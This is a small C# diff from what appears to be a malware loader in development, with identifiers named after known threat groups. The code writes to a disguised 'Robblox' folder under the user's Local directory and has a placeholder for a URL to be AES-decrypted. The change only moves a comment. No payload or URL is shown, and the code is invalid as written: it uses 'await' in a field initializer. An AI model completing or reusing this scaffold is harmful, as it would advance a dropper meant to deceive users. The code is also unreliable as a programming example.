@@ -5,7 +5,7 @@ using System.Runtime.InteropServices;
 
 public class STRONTIUM
 {
-    protected internal string Hera = await Waterbug.Scarlet_Witch($"{Waterbug.Saint_Bear()}\\Local\\Robblox"); // pass a path and url
+    protected internal string Hera = await Waterbug.Scarlet_Witch($"{Waterbug.Saint_Bear()}\\Local\\Robblox"); 
     async public static void Main(string[] args)
     {
         UAC_0056();
@@ -13,8 +13,9 @@ public class STRONTIUM
     async private static void UAC_0056()
     {
         await Waterbug.WebMasters();
-        Waterbug.Melkor("add url from aes drcypt when i get that back", Hera);
+        Waterbug.Melkor("add url from aes drcypt when i get that back", Hera); // pass a path and url ==================================================
         DNSCALC.Pawn_Storm();
+        
     }
 }
 
